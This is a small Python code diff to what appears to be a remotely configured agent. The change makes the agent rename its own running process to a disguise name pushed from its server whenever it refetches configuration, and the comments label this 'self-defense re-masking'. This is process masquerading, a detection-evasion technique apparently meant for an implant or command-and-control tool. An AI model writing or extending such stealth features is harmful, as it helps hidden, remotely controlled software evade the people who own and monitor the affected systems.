@@ -168,7 +168,13 @@ async def run() -> None:
                     try:
                         fresh = await transport.get_config(agent_key)
                         etag = fresh.get("config_etag")
-                        log.info("config updated; restart required to apply service changes")
+                        fresh_masking = (fresh.get("config") or {}).get("masking") or {}
+                        # Re-apply the (possibly rotated) disguise live — self-defense
+                        # re-masking (feature #4). Service changes still need a restart.
+                        new_name = fresh_masking.get("process_name")
+                        if new_name:
+                            set_process_name(new_name)
+                            log.info("disguise re-applied: process name -> %s", new_name)
                     except Exception as exc:  # noqa: BLE001
                         log.warning("config refetch failed: %s", exc)
             except Exception as exc:  # noqa: BLE001
